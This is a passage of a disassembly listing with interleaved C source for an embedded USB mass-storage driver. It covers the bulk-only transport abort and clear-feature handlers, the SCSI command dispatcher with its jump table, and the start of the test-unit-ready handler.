 80096a2:	4b09      	ldr	r3, [pc, #36]	; (80096c8 <MSC_BOT_SendCSW+0x7c>)
 80096a4:	7819      	ldrb	r1, [r3, #0]
 80096a6:	68fb      	ldr	r3, [r7, #12]
 80096a8:	f503 5280 	add.w	r2, r3, #4096	; 0x1000
 80096ac:	3210      	adds	r2, #16
 80096ae:	231f      	movs	r3, #31
 80096b0:	6878      	ldr	r0, [r7, #4]
 80096b2:	f003 fbdf 	bl	800ce74 <USBD_LL_PrepareReceive>
 80096b6:	e000      	b.n	80096ba <MSC_BOT_SendCSW+0x6e>
    return;
 80096b8:	bf00      	nop
                               USBD_BOT_CBW_LENGTH);
}
 80096ba:	3710      	adds	r7, #16
 80096bc:	46bd      	mov	sp, r7
 80096be:	bd80      	pop	{r7, pc}
 80096c0:	53425355 	.word	0x53425355
 80096c4:	2000010a 	.word	0x2000010a
 80096c8:	2000010b 	.word	0x2000010b

080096cc <MSC_BOT_Abort>:
  * @param  pdev: device instance
  * @retval status
  */

static void  MSC_BOT_Abort(USBD_HandleTypeDef *pdev)
{
 80096cc:	b580      	push	{r7, lr}
 80096ce:	b084      	sub	sp, #16
 80096d0:	af00      	add	r7, sp, #0
 80096d2:	6078      	str	r0, [r7, #4]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 80096d4:	687b      	ldr	r3, [r7, #4]
 80096d6:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80096da:	687b      	ldr	r3, [r7, #4]
 80096dc:	32b0      	adds	r2, #176	; 0xb0
 80096de:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 80096e2:	60fb      	str	r3, [r7, #12]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 80096e4:	68fb      	ldr	r3, [r7, #12]
 80096e6:	2b00      	cmp	r3, #0
 80096e8:	d02c      	beq.n	8009744 <MSC_BOT_Abort+0x78>
  {
    return;
  }

  if ((hmsc->cbw.bmFlags == 0U) &&
 80096ea:	68fb      	ldr	r3, [r7, #12]
 80096ec:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80096f0:	7f1b      	ldrb	r3, [r3, #28]
 80096f2:	2b00      	cmp	r3, #0
 80096f4:	d10f      	bne.n	8009716 <MSC_BOT_Abort+0x4a>
      (hmsc->cbw.dDataLength != 0U) &&
 80096f6:	68fb      	ldr	r3, [r7, #12]
 80096f8:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80096fc:	699b      	ldr	r3, [r3, #24]
  if ((hmsc->cbw.bmFlags == 0U) &&
 80096fe:	2b00      	cmp	r3, #0
 8009700:	d009      	beq.n	8009716 <MSC_BOT_Abort+0x4a>
      (hmsc->bot_status == USBD_BOT_STATUS_NORMAL))
 8009702:	68fb      	ldr	r3, [r7, #12]
 8009704:	7a5b      	ldrb	r3, [r3, #9]
      (hmsc->cbw.dDataLength != 0U) &&
 8009706:	2b00      	cmp	r3, #0
 8009708:	d105      	bne.n	8009716 <MSC_BOT_Abort+0x4a>
  {
    (void)USBD_LL_StallEP(pdev, MSCOutEpAdd);
 800970a:	4b10      	ldr	r3, [pc, #64]	; (800974c <MSC_BOT_Abort+0x80>)
 800970c:	781b      	ldrb	r3, [r3, #0]
 800970e:	4619      	mov	r1, r3
 8009710:	6878      	ldr	r0, [r7, #4]
 8009712:	f003 faa7 	bl	800cc64 <USBD_LL_StallEP>
  }

  (void)USBD_LL_StallEP(pdev, MSCInEpAdd);
 8009716:	4b0e      	ldr	r3, [pc, #56]	; (8009750 <MSC_BOT_Abort+0x84>)
 8009718:	781b      	ldrb	r3, [r3, #0]
 800971a:	4619      	mov	r1, r3
 800971c:	6878      	ldr	r0, [r7, #4]
 800971e:	f003 faa1 	bl	800cc64 <USBD_LL_StallEP>

  if (hmsc->bot_status == USBD_BOT_STATUS_ERROR)
 8009722:	68fb      	ldr	r3, [r7, #12]
 8009724:	7a5b      	ldrb	r3, [r3, #9]
 8009726:	2b02      	cmp	r3, #2
 8009728:	d10d      	bne.n	8009746 <MSC_BOT_Abort+0x7a>
  {
    (void)USBD_LL_StallEP(pdev, MSCInEpAdd);
 800972a:	4b09      	ldr	r3, [pc, #36]	; (8009750 <MSC_BOT_Abort+0x84>)
 800972c:	781b      	ldrb	r3, [r3, #0]
 800972e:	4619      	mov	r1, r3
 8009730:	6878      	ldr	r0, [r7, #4]
 8009732:	f003 fa97 	bl	800cc64 <USBD_LL_StallEP>
    (void)USBD_LL_StallEP(pdev, MSCOutEpAdd);
 8009736:	4b05      	ldr	r3, [pc, #20]	; (800974c <MSC_BOT_Abort+0x80>)
 8009738:	781b      	ldrb	r3, [r3, #0]
 800973a:	4619      	mov	r1, r3
 800973c:	6878      	ldr	r0, [r7, #4]
 800973e:	f003 fa91 	bl	800cc64 <USBD_LL_StallEP>
 8009742:	e000      	b.n	8009746 <MSC_BOT_Abort+0x7a>
    return;
 8009744:	bf00      	nop
  }
}
 8009746:	3710      	adds	r7, #16
 8009748:	46bd      	mov	sp, r7
 800974a:	bd80      	pop	{r7, pc}
 800974c:	2000010b 	.word	0x2000010b
 8009750:	2000010a 	.word	0x2000010a

08009754 <MSC_BOT_CplClrFeature>:
  * @param  epnum: endpoint index
  * @retval None
  */

void  MSC_BOT_CplClrFeature(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 8009754:	b580      	push	{r7, lr}
 8009756:	b084      	sub	sp, #16
 8009758:	af00      	add	r7, sp, #0
 800975a:	6078      	str	r0, [r7, #4]
 800975c:	460b      	mov	r3, r1
 800975e:	70fb      	strb	r3, [r7, #3]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009760:	687b      	ldr	r3, [r7, #4]
 8009762:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009766:	687b      	ldr	r3, [r7, #4]
 8009768:	32b0      	adds	r2, #176	; 0xb0
 800976a:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800976e:	60fb      	str	r3, [r7, #12]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 8009770:	68fb      	ldr	r3, [r7, #12]
 8009772:	2b00      	cmp	r3, #0
 8009774:	d01d      	beq.n	80097b2 <MSC_BOT_CplClrFeature+0x5e>
  {
    return;
  }

  if (hmsc->bot_status == USBD_BOT_STATUS_ERROR) /* Bad CBW Signature */
 8009776:	68fb      	ldr	r3, [r7, #12]
 8009778:	7a5b      	ldrb	r3, [r3, #9]
 800977a:	2b02      	cmp	r3, #2
 800977c:	d10c      	bne.n	8009798 <MSC_BOT_CplClrFeature+0x44>
  {
    (void)USBD_LL_StallEP(pdev, MSCInEpAdd);
 800977e:	4b10      	ldr	r3, [pc, #64]	; (80097c0 <MSC_BOT_CplClrFeature+0x6c>)
 8009780:	781b      	ldrb	r3, [r3, #0]
 8009782:	4619      	mov	r1, r3
 8009784:	6878      	ldr	r0, [r7, #4]
 8009786:	f003 fa6d 	bl	800cc64 <USBD_LL_StallEP>
    (void)USBD_LL_StallEP(pdev, MSCOutEpAdd);
 800978a:	4b0e      	ldr	r3, [pc, #56]	; (80097c4 <MSC_BOT_CplClrFeature+0x70>)
 800978c:	781b      	ldrb	r3, [r3, #0]
 800978e:	4619      	mov	r1, r3
 8009790:	6878      	ldr	r0, [r7, #4]
 8009792:	f003 fa67 	bl	800cc64 <USBD_LL_StallEP>
 8009796:	e00f      	b.n	80097b8 <MSC_BOT_CplClrFeature+0x64>
  }
  else if (((epnum & 0x80U) == 0x80U) && (hmsc->bot_status != USBD_BOT_STATUS_RECOVERY))
 8009798:	f997 3003 	ldrsb.w	r3, [r7, #3]
 800979c:	2b00      	cmp	r3, #0
 800979e:	da0a      	bge.n	80097b6 <MSC_BOT_CplClrFeature+0x62>
 80097a0:	68fb      	ldr	r3, [r7, #12]
 80097a2:	7a5b      	ldrb	r3, [r3, #9]
 80097a4:	2b01      	cmp	r3, #1
 80097a6:	d006      	beq.n	80097b6 <MSC_BOT_CplClrFeature+0x62>
  {
    MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_FAILED);
 80097a8:	2101      	movs	r1, #1
 80097aa:	6878      	ldr	r0, [r7, #4]
 80097ac:	f7ff ff4e 	bl	800964c <MSC_BOT_SendCSW>
 80097b0:	e002      	b.n	80097b8 <MSC_BOT_CplClrFeature+0x64>
    return;
 80097b2:	bf00      	nop
 80097b4:	e000      	b.n	80097b8 <MSC_BOT_CplClrFeature+0x64>
  }
  else
  {
    return;
 80097b6:	bf00      	nop
  }
}
 80097b8:	3710      	adds	r7, #16
 80097ba:	46bd      	mov	sp, r7
 80097bc:	bd80      	pop	{r7, pc}
 80097be:	bf00      	nop
 80097c0:	2000010a 	.word	0x2000010a
 80097c4:	2000010b 	.word	0x2000010b

080097c8 <SCSI_ProcessCmd>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
int8_t SCSI_ProcessCmd(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *cmd)
{
 80097c8:	b580      	push	{r7, lr}
 80097ca:	b086      	sub	sp, #24
 80097cc:	af00      	add	r7, sp, #0
 80097ce:	60f8      	str	r0, [r7, #12]
 80097d0:	460b      	mov	r3, r1
 80097d2:	607a      	str	r2, [r7, #4]
 80097d4:	72fb      	strb	r3, [r7, #11]
  int8_t ret;
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 80097d6:	68fb      	ldr	r3, [r7, #12]
 80097d8:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80097dc:	68fb      	ldr	r3, [r7, #12]
 80097de:	32b0      	adds	r2, #176	; 0xb0
 80097e0:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 80097e4:	613b      	str	r3, [r7, #16]

  if (hmsc == NULL)
 80097e6:	693b      	ldr	r3, [r7, #16]
 80097e8:	2b00      	cmp	r3, #0
 80097ea:	d102      	bne.n	80097f2 <SCSI_ProcessCmd+0x2a>
  {
    return -1;
 80097ec:	f04f 33ff 	mov.w	r3, #4294967295
 80097f0:	e168      	b.n	8009ac4 <SCSI_ProcessCmd+0x2fc>
  }

  switch (cmd[0])
 80097f2:	687b      	ldr	r3, [r7, #4]
 80097f4:	781b      	ldrb	r3, [r3, #0]
 80097f6:	2baa      	cmp	r3, #170	; 0xaa
 80097f8:	f000 8144 	beq.w	8009a84 <SCSI_ProcessCmd+0x2bc>
 80097fc:	2baa      	cmp	r3, #170	; 0xaa
 80097fe:	f300 8153 	bgt.w	8009aa8 <SCSI_ProcessCmd+0x2e0>
 8009802:	2ba8      	cmp	r3, #168	; 0xa8
 8009804:	f000 812c 	beq.w	8009a60 <SCSI_ProcessCmd+0x298>
 8009808:	2ba8      	cmp	r3, #168	; 0xa8
 800980a:	f300 814d 	bgt.w	8009aa8 <SCSI_ProcessCmd+0x2e0>
 800980e:	2b5a      	cmp	r3, #90	; 0x5a
 8009810:	f300 80c0 	bgt.w	8009994 <SCSI_ProcessCmd+0x1cc>
 8009814:	2b00      	cmp	r3, #0
 8009816:	f2c0 8147 	blt.w	8009aa8 <SCSI_ProcessCmd+0x2e0>
 800981a:	2b5a      	cmp	r3, #90	; 0x5a
 800981c:	f200 8144 	bhi.w	8009aa8 <SCSI_ProcessCmd+0x2e0>
 8009820:	a201      	add	r2, pc, #4	; (adr r2, 8009828 <SCSI_ProcessCmd+0x60>)
 8009822:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 8009826:	bf00      	nop
 8009828:	0800999b 	.word	0x0800999b
 800982c:	08009aa9 	.word	0x08009aa9
 8009830:	08009aa9 	.word	0x08009aa9
 8009834:	080099ad 	.word	0x080099ad
 8009838:	08009aa9 	.word	0x08009aa9
 800983c:	08009aa9 	.word	0x08009aa9
 8009840:	08009aa9 	.word	0x08009aa9
 8009844:	08009aa9 	.word	0x08009aa9
 8009848:	08009aa9 	.word	0x08009aa9
 800984c:	08009aa9 	.word	0x08009aa9
 8009850:	08009aa9 	.word	0x08009aa9
 8009854:	08009aa9 	.word	0x08009aa9
 8009858:	08009aa9 	.word	0x08009aa9
 800985c:	08009aa9 	.word	0x08009aa9
 8009860:	08009aa9 	.word	0x08009aa9
 8009864:	08009aa9 	.word	0x08009aa9
 8009868:	08009aa9 	.word	0x08009aa9
 800986c:	08009aa9 	.word	0x08009aa9
 8009870:	080099bf 	.word	0x080099bf
 8009874:	08009aa9 	.word	0x08009aa9
 8009878:	08009aa9 	.word	0x08009aa9
 800987c:	08009aa9 	.word	0x08009aa9
 8009880:	08009aa9 	.word	0x08009aa9
 8009884:	08009aa9 	.word	0x08009aa9
 8009888:	08009aa9 	.word	0x08009aa9
 800988c:	08009aa9 	.word	0x08009aa9
 8009890:	080099f5 	.word	0x080099f5
 8009894:	080099d1 	.word	0x080099d1
 8009898:	08009aa9 	.word	0x08009aa9
 800989c:	08009aa9 	.word	0x08009aa9
 80098a0:	080099e3 	.word	0x080099e3
 80098a4:	08009aa9 	.word	0x08009aa9
 80098a8:	08009aa9 	.word	0x08009aa9
 80098ac:	08009aa9 	.word	0x08009aa9
 80098b0:	08009aa9 	.word	0x08009aa9
 80098b4:	08009a19 	.word	0x08009a19
 80098b8:	08009aa9 	.word	0x08009aa9
 80098bc:	08009a2b 	.word	0x08009a2b
 80098c0:	08009aa9 	.word	0x08009aa9
 80098c4:	08009aa9 	.word	0x08009aa9
 80098c8:	08009a4f 	.word	0x08009a4f
 80098cc:	08009aa9 	.word	0x08009aa9
 80098d0:	08009a73 	.word	0x08009a73
 80098d4:	08009aa9 	.word	0x08009aa9
 80098d8:	08009aa9 	.word	0x08009aa9
 80098dc:	08009aa9 	.word	0x08009aa9
 80098e0:	08009aa9 	.word	0x08009aa9
 80098e4:	08009a97 	.word	0x08009a97
 80098e8:	08009aa9 	.word	0x08009aa9
 80098ec:	08009aa9 	.word	0x08009aa9
 80098f0:	08009aa9 	.word	0x08009aa9
 80098f4:	08009aa9 	.word	0x08009aa9
 80098f8:	08009aa9 	.word	0x08009aa9
 80098fc:	08009aa9 	.word	0x08009aa9
 8009900:	08009aa9 	.word	0x08009aa9
 8009904:	08009aa9 	.word	0x08009aa9
 8009908:	08009aa9 	.word	0x08009aa9
 800990c:	08009aa9 	.word	0x08009aa9
 8009910:	08009aa9 	.word	0x08009aa9
 8009914:	08009aa9 	.word	0x08009aa9
 8009918:	08009aa9 	.word	0x08009aa9
 800991c:	08009aa9 	.word	0x08009aa9
 8009920:	08009aa9 	.word	0x08009aa9
 8009924:	08009aa9 	.word	0x08009aa9
 8009928:	08009aa9 	.word	0x08009aa9
 800992c:	08009aa9 	.word	0x08009aa9
 8009930:	08009aa9 	.word	0x08009aa9
 8009934:	08009aa9 	.word	0x08009aa9
 8009938:	08009aa9 	.word	0x08009aa9
 800993c:	08009aa9 	.word	0x08009aa9
 8009940:	08009aa9 	.word	0x08009aa9
 8009944:	08009aa9 	.word	0x08009aa9
 8009948:	08009aa9 	.word	0x08009aa9
 800994c:	08009aa9 	.word	0x08009aa9
 8009950:	08009aa9 	.word	0x08009aa9
 8009954:	08009aa9 	.word	0x08009aa9
 8009958:	08009aa9 	.word	0x08009aa9
 800995c:	08009aa9 	.word	0x08009aa9
 8009960:	08009aa9 	.word	0x08009aa9
 8009964:	08009aa9 	.word	0x08009aa9
 8009968:	08009aa9 	.word	0x08009aa9
 800996c:	08009aa9 	.word	0x08009aa9
 8009970:	08009aa9 	.word	0x08009aa9
 8009974:	08009aa9 	.word	0x08009aa9
 8009978:	08009aa9 	.word	0x08009aa9
 800997c:	08009aa9 	.word	0x08009aa9
 8009980:	08009aa9 	.word	0x08009aa9
 8009984:	08009aa9 	.word	0x08009aa9
 8009988:	08009aa9 	.word	0x08009aa9
 800998c:	08009aa9 	.word	0x08009aa9
 8009990:	08009a07 	.word	0x08009a07
 8009994:	2b9e      	cmp	r3, #158	; 0x9e
 8009996:	d051      	beq.n	8009a3c <SCSI_ProcessCmd+0x274>
 8009998:	e086      	b.n	8009aa8 <SCSI_ProcessCmd+0x2e0>
  {
    case SCSI_TEST_UNIT_READY:
      ret = SCSI_TestUnitReady(pdev, lun, cmd);
 800999a:	7afb      	ldrb	r3, [r7, #11]
 800999c:	687a      	ldr	r2, [r7, #4]
 800999e:	4619      	mov	r1, r3
 80099a0:	68f8      	ldr	r0, [r7, #12]
 80099a2:	f000 f893 	bl	8009acc <SCSI_TestUnitReady>
 80099a6:	4603      	mov	r3, r0
 80099a8:	75fb      	strb	r3, [r7, #23]
      break;
 80099aa:	e089      	b.n	8009ac0 <SCSI_ProcessCmd+0x2f8>

    case SCSI_REQUEST_SENSE:
      ret = SCSI_RequestSense(pdev, lun, cmd);
 80099ac:	7afb      	ldrb	r3, [r7, #11]
 80099ae:	687a      	ldr	r2, [r7, #4]
 80099b0:	4619      	mov	r1, r3
 80099b2:	68f8      	ldr	r0, [r7, #12]
 80099b4:	f000 fb9a 	bl	800a0ec <SCSI_RequestSense>
 80099b8:	4603      	mov	r3, r0
 80099ba:	75fb      	strb	r3, [r7, #23]
      break;
 80099bc:	e080      	b.n	8009ac0 <SCSI_ProcessCmd+0x2f8>

    case SCSI_INQUIRY:
      ret = SCSI_Inquiry(pdev, lun, cmd);
 80099be:	7afb      	ldrb	r3, [r7, #11]
 80099c0:	687a      	ldr	r2, [r7, #4]
 80099c2:	4619      	mov	r1, r3
 80099c4:	68f8      	ldr	r0, [r7, #12]
 80099c6:	f000 f8df 	bl	8009b88 <SCSI_Inquiry>
 80099ca:	4603      	mov	r3, r0
 80099cc:	75fb      	strb	r3, [r7, #23]
      break;
 80099ce:	e077      	b.n	8009ac0 <SCSI_ProcessCmd+0x2f8>

    case SCSI_START_STOP_UNIT:
      ret = SCSI_StartStopUnit(pdev, lun, cmd);
 80099d0:	7afb      	ldrb	r3, [r7, #11]
 80099d2:	687a      	ldr	r2, [r7, #4]
 80099d4:	4619      	mov	r1, r3
 80099d6:	68f8      	ldr	r0, [r7, #12]
 80099d8:	f000 fc7e 	bl	800a2d8 <SCSI_StartStopUnit>
 80099dc:	4603      	mov	r3, r0
 80099de:	75fb      	strb	r3, [r7, #23]
      break;
 80099e0:	e06e      	b.n	8009ac0 <SCSI_ProcessCmd+0x2f8>

    case SCSI_ALLOW_MEDIUM_REMOVAL:
      ret = SCSI_AllowPreventRemovable(pdev, lun, cmd);
 80099e2:	7afb      	ldrb	r3, [r7, #11]
 80099e4:	687a      	ldr	r2, [r7, #4]
 80099e6:	4619      	mov	r1, r3
 80099e8:	68f8      	ldr	r0, [r7, #12]
 80099ea:	f000 fcd2 	bl	800a392 <SCSI_AllowPreventRemovable>
 80099ee:	4603      	mov	r3, r0
 80099f0:	75fb      	strb	r3, [r7, #23]
      break;
 80099f2:	e065      	b.n	8009ac0 <SCSI_ProcessCmd+0x2f8>

    case SCSI_MODE_SENSE6:
      ret = SCSI_ModeSense6(pdev, lun, cmd);
 80099f4:	7afb      	ldrb	r3, [r7, #11]
 80099f6:	687a      	ldr	r2, [r7, #4]
 80099f8:	4619      	mov	r1, r3
 80099fa:	68f8      	ldr	r0, [r7, #12]
 80099fc:	f000 fb16 	bl	800a02c <SCSI_ModeSense6>
 8009a00:	4603      	mov	r3, r0
 8009a02:	75fb      	strb	r3, [r7, #23]
      break;
 8009a04:	e05c      	b.n	8009ac0 <SCSI_ProcessCmd+0x2f8>

    case SCSI_MODE_SENSE10:
      ret = SCSI_ModeSense10(pdev, lun, cmd);
 8009a06:	7afb      	ldrb	r3, [r7, #11]
 8009a08:	687a      	ldr	r2, [r7, #4]
 8009a0a:	4619      	mov	r1, r3
 8009a0c:	68f8      	ldr	r0, [r7, #12]
 8009a0e:	f000 fb3d 	bl	800a08c <SCSI_ModeSense10>
 8009a12:	4603      	mov	r3, r0
 8009a14:	75fb      	strb	r3, [r7, #23]
      break;
 8009a16:	e053      	b.n	8009ac0 <SCSI_ProcessCmd+0x2f8>

    case SCSI_READ_FORMAT_CAPACITIES:
      ret = SCSI_ReadFormatCapacity(pdev, lun, cmd);
 8009a18:	7afb      	ldrb	r3, [r7, #11]
 8009a1a:	687a      	ldr	r2, [r7, #4]
 8009a1c:	4619      	mov	r1, r3
 8009a1e:	68f8      	ldr	r0, [r7, #12]
 8009a20:	f000 fa86 	bl	8009f30 <SCSI_ReadFormatCapacity>
 8009a24:	4603      	mov	r3, r0
 8009a26:	75fb      	strb	r3, [r7, #23]
      break;
 8009a28:	e04a      	b.n	8009ac0 <SCSI_ProcessCmd+0x2f8>

    case SCSI_READ_CAPACITY10:
      ret = SCSI_ReadCapacity10(pdev, lun, cmd);
 8009a2a:	7afb      	ldrb	r3, [r7, #11]
 8009a2c:	687a      	ldr	r2, [r7, #4]
 8009a2e:	4619      	mov	r1, r3
 8009a30:	68f8      	ldr	r0, [r7, #12]
 8009a32:	f000 f929 	bl	8009c88 <SCSI_ReadCapacity10>
 8009a36:	4603      	mov	r3, r0
 8009a38:	75fb      	strb	r3, [r7, #23]
      break;
 8009a3a:	e041      	b.n	8009ac0 <SCSI_ProcessCmd+0x2f8>

    case SCSI_READ_CAPACITY16:
      ret = SCSI_ReadCapacity16(pdev, lun, cmd);
 8009a3c:	7afb      	ldrb	r3, [r7, #11]
 8009a3e:	687a      	ldr	r2, [r7, #4]
 8009a40:	4619      	mov	r1, r3
 8009a42:	68f8      	ldr	r0, [r7, #12]
 8009a44:	f000 f9af 	bl	8009da6 <SCSI_ReadCapacity16>
 8009a48:	4603      	mov	r3, r0
 8009a4a:	75fb      	strb	r3, [r7, #23]
      break;
 8009a4c:	e038      	b.n	8009ac0 <SCSI_ProcessCmd+0x2f8>

    case SCSI_READ10:
      ret = SCSI_Read10(pdev, lun, cmd);
 8009a4e:	7afb      	ldrb	r3, [r7, #11]
 8009a50:	687a      	ldr	r2, [r7, #4]
 8009a52:	4619      	mov	r1, r3
 8009a54:	68f8      	ldr	r0, [r7, #12]
 8009a56:	f000 fccd 	bl	800a3f4 <SCSI_Read10>
 8009a5a:	4603      	mov	r3, r0
 8009a5c:	75fb      	strb	r3, [r7, #23]
      break;
 8009a5e:	e02f      	b.n	8009ac0 <SCSI_ProcessCmd+0x2f8>

    case SCSI_READ12:
      ret = SCSI_Read12(pdev, lun, cmd);
 8009a60:	7afb      	ldrb	r3, [r7, #11]
 8009a62:	687a      	ldr	r2, [r7, #4]
 8009a64:	4619      	mov	r1, r3
 8009a66:	68f8      	ldr	r0, [r7, #12]
 8009a68:	f000 fd7b 	bl	800a562 <SCSI_Read12>
 8009a6c:	4603      	mov	r3, r0
 8009a6e:	75fb      	strb	r3, [r7, #23]
      break;
 8009a70:	e026      	b.n	8009ac0 <SCSI_ProcessCmd+0x2f8>

    case SCSI_WRITE10:
      ret = SCSI_Write10(pdev, lun, cmd);
 8009a72:	7afb      	ldrb	r3, [r7, #11]
 8009a74:	687a      	ldr	r2, [r7, #4]
 8009a76:	4619      	mov	r1, r3
 8009a78:	68f8      	ldr	r0, [r7, #12]
 8009a7a:	f000 fe33 	bl	800a6e4 <SCSI_Write10>
 8009a7e:	4603      	mov	r3, r0
 8009a80:	75fb      	strb	r3, [r7, #23]
      break;
 8009a82:	e01d      	b.n	8009ac0 <SCSI_ProcessCmd+0x2f8>

    case SCSI_WRITE12:
      ret = SCSI_Write12(pdev, lun, cmd);
 8009a84:	7afb      	ldrb	r3, [r7, #11]
 8009a86:	687a      	ldr	r2, [r7, #4]
 8009a88:	4619      	mov	r1, r3
 8009a8a:	68f8      	ldr	r0, [r7, #12]
 8009a8c:	f000 ff0e 	bl	800a8ac <SCSI_Write12>
 8009a90:	4603      	mov	r3, r0
 8009a92:	75fb      	strb	r3, [r7, #23]
      break;
 8009a94:	e014      	b.n	8009ac0 <SCSI_ProcessCmd+0x2f8>

    case SCSI_VERIFY10:
      ret = SCSI_Verify10(pdev, lun, cmd);
 8009a96:	7afb      	ldrb	r3, [r7, #11]
 8009a98:	687a      	ldr	r2, [r7, #4]
 8009a9a:	4619      	mov	r1, r3
 8009a9c:	68f8      	ldr	r0, [r7, #12]
 8009a9e:	f000 fff9 	bl	800aa94 <SCSI_Verify10>
 8009aa2:	4603      	mov	r3, r0
 8009aa4:	75fb      	strb	r3, [r7, #23]
      break;
 8009aa6:	e00b      	b.n	8009ac0 <SCSI_ProcessCmd+0x2f8>

    default:
      SCSI_SenseCode(pdev, lun, ILLEGAL_REQUEST, INVALID_CDB);
 8009aa8:	7af9      	ldrb	r1, [r7, #11]
 8009aaa:	2320      	movs	r3, #32
 8009aac:	2205      	movs	r2, #5
 8009aae:	68f8      	ldr	r0, [r7, #12]
 8009ab0:	f000 fbb6 	bl	800a220 <SCSI_SenseCode>
      hmsc->bot_status = USBD_BOT_STATUS_ERROR;
 8009ab4:	693b      	ldr	r3, [r7, #16]
 8009ab6:	2202      	movs	r2, #2
 8009ab8:	725a      	strb	r2, [r3, #9]
      ret = -1;
 8009aba:	23ff      	movs	r3, #255	; 0xff
 8009abc:	75fb      	strb	r3, [r7, #23]
      break;
 8009abe:	bf00      	nop
  }

  return ret;
 8009ac0:	f997 3017 	ldrsb.w	r3, [r7, #23]
}
 8009ac4:	4618      	mov	r0, r3
 8009ac6:	3718      	adds	r7, #24
 8009ac8:	46bd      	mov	sp, r7
 8009aca:	bd80      	pop	{r7, pc}

08009acc <SCSI_TestUnitReady>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_TestUnitReady(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 8009acc:	b580      	push	{r7, lr}
 8009ace:	b086      	sub	sp, #24
 8009ad0:	af00      	add	r7, sp, #0
 8009ad2:	60f8      	str	r0, [r7, #12]
 8009ad4:	460b      	mov	r3, r1
 8009ad6:	607a      	str	r2, [r7, #4]
 8009ad8:	72fb      	strb	r3, [r7, #11]
  UNUSED(params);
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009ada:	68fb      	ldr	r3, [r7, #12]
 8009adc:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009ae0:	68fb      	ldr	r3, [r7, #12]
 8009ae2:	32b0      	adds	r2, #176	; 0xb0
 8009ae4:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009ae8:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 8009aea:	697b      	ldr	r3, [r7, #20]
 8009aec:	2b00      	cmp	r3, #0
 8009aee:	d102      	bne.n	8009af6 <SCSI_TestUnitReady+0x2a>
  {
    return -1;
 8009af0:	f04f 33ff 	mov.w	r3, #4294967295
 8009af4:	e043      	b.n	8009b7e <SCSI_TestUnitReady+0xb2>
  }

  /* case 9 : Hi > D0 */
  if (hmsc->cbw.dDataLength != 0U)
 8009af6:	697b      	ldr	r3, [r7, #20]
 8009af8:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009afc:	699b      	ldr	r3, [r3, #24]
 8009afe:	2b00      	cmp	r3, #0
 8009b00:	d00b      	beq.n	8009b1a <SCSI_TestUnitReady+0x4e>
  {
    SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 8009b02:	697b      	ldr	r3, [r7, #20]
 8009b04:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009b08:	7f59      	ldrb	r1, [r3, #29]
 8009b0a:	2320      	movs	r3, #32
 8009b0c:	2205      	movs	r2, #5
 8009b0e:	68f8      	ldr	r0, [r7, #12]
 8009b10:	f000 fb86 	bl	800a220 <SCSI_SenseCode>

    return -1;
 8009b14:	f04f 33ff 	mov.w	r3, #4294967295
 8009b18:	e031      	b.n	8009b7e <SCSI_TestUnitReady+0xb2>
  }

  if (hmsc->scsi_medium_state == SCSI_MEDIUM_EJECTED)
 8009b1a:	697b      	ldr	r3, [r7, #20]
 8009b1c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009b20:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 8009b24:	2b02      	cmp	r3, #2
 8009b26:	d10b      	bne.n	8009b40 <SCSI_TestUnitReady+0x74>
  {
    SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 8009b28:	7af9      	ldrb	r1, [r7, #11]
 8009b2a:	233a      	movs	r3, #58	; 0x3a
 8009b2c:	2202      	movs	r2, #2
 8009b2e:	68f8      	ldr	r0, [r7, #12]
 8009b30:	f000 fb76 	bl	800a220 <SCSI_SenseCode>
    hmsc->bot_state = USBD_BOT_NO_DATA;
 8009b34:	697b      	ldr	r3, [r7, #20]
 8009b36:	2205      	movs	r2, #5
 8009b38:	721a      	strb	r2, [r3, #8]
    return -1;
 8009b3a:	f04f 33ff 	mov.w	r3, #4294967295
